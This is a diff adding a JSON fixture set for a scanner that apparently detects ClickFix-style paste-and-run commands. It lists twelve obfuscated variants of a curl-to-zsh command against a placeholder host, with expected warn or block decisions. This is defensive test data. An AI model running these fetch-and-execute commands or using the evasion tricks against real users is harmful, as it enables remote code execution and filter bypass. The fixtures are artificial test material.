@@ -1,0 +1,357 @@
+[
+  {
+    "fixture_id": "CF-OBF-001",
+    "name": "Fragmented downloader name",
+    "category": "obfuscation",
+    "description": "Fragmented downloader name supplied only as inert scanner data.",
+    "command_text": "c='cu' ; r='rl' ; \"$c$r\" -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "reconstructed_executable"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-002",
+    "name": "Fragmented interpreter name",
+    "category": "obfuscation",
+    "description": "Fragmented interpreter name supplied only as inert scanner data.",
+    "command_text": "s='z' ; h='sh' ; curl -fsSL https://example.invalid/fix | \"$s$h\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "reconstructed_executable"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-003",
+    "name": "Escaped executable name",
+    "category": "obfuscation",
+    "description": "Escaped executable name supplied only as inert scanner data.",
+    "command_text": "c\\u\\r\\l -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "execution_obfuscation_escaped_name"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-004",
+    "name": "printf reconstruction",
+    "category": "obfuscation",
+    "description": "printf reconstruction supplied only as inert scanner data.",
+    "command_text": "$(printf '%s%s' cu rl) -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "command_name_reconstruction"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-005",
+    "name": "Reverse-string reconstruction",
+    "category": "obfuscation",
+    "description": "Reverse-string reconstruction supplied only as inert scanner data.",
+    "command_text": "name='lruc' ; printf '%s' \"$name\" | rev",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "execution_obfuscation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-006",
+    "name": "Character translation reconstruction",
+    "category": "obfuscation",
+    "description": "Character translation reconstruction supplied only as inert scanner data.",
+    "command_text": "printf 'dvsm' | tr 'd-v' 'c-u'",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "warn",
+    "minimum_score": 4,
+    "required_rule_ids": [
+      "execution_obfuscation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-007",
+    "name": "Environment-variable interpreter",
+    "category": "obfuscation",
+    "description": "Environment-variable interpreter supplied only as inert scanner data.",
+    "command_text": "SHELL_RUNNER=zsh ; curl -fsSL https://example.invalid/fix | \"$SHELL_RUNNER\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "environment_indirection"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-008",
+    "name": "Absolute-path binaries",
+    "category": "obfuscation",
+    "description": "Absolute-path binaries supplied only as inert scanner data.",
+    "command_text": "/usr/bin/curl -fsSL https://example.invalid/fix | /bin/zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-009",
+    "name": "Quoted command fragments",
+    "category": "obfuscation",
+    "description": "Quoted command fragments supplied only as inert scanner data.",
+    "command_text": "\"c\"\"u\"\"r\"\"l\" -fsSL https://example.invalid/fix | \"z\"\"s\"\"h\"",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-010",
+    "name": "Unicode whitespace",
+    "category": "obfuscation",
+    "description": "Unicode whitespace supplied only as inert scanner data.",
+    "command_text": "curl\u00a0-fsSL\u00a0https://example.invalid/fix\u00a0|\u00a0zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "execution_obfuscation_unicode"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-011",
+    "name": "Zero-width insertion",
+    "category": "obfuscation",
+    "description": "Zero-width insertion supplied only as inert scanner data.",
+    "command_text": "cu\u200brl -fsSL https://example.invalid/fix | zsh",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "execution_obfuscation_unicode"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  },
+  {
+    "fixture_id": "CF-OBF-012",
+    "name": "ANSI controls",
+    "category": "obfuscation",
+    "description": "ANSI controls supplied only as inert scanner data.",
+    "command_text": "\u001b[31mcurl -fsSL https://example.invalid/fix | zsh\u001b[0m",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "network_to_interpreter",
+      "execution_obfuscation_control"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed."
+  }
+]
